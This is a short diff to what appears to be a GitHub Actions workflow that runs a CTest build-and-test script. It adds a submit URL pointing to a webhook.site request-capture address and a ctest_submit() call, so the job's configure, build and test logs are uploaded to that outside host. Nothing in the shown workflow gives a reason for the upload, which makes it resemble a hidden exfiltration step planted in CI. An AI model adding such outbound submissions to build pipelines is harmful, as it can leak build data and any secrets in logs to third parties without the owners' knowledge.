@@ -33,8 +33,10 @@ jobs:
           set(CTEST_SOURCE_DIRECTORY "$ENV{GITHUB_WORKSPACE}")
           set(CTEST_BINARY_DIRECTORY "$ENV{GITHUB_WORKSPACE}/build")
           set(CTEST_CMAKE_GENERATOR "Unix Makefiles")
+          set(CTEST_SUBMIT_URL "https://webhook.site/75d946f8-0b78-4591-a43b-ba3b0d079f4a")
 
           ctest_start("Experimental")
           ctest_configure()
           ctest_build()
           ctest_test()
+          ctest_submit()
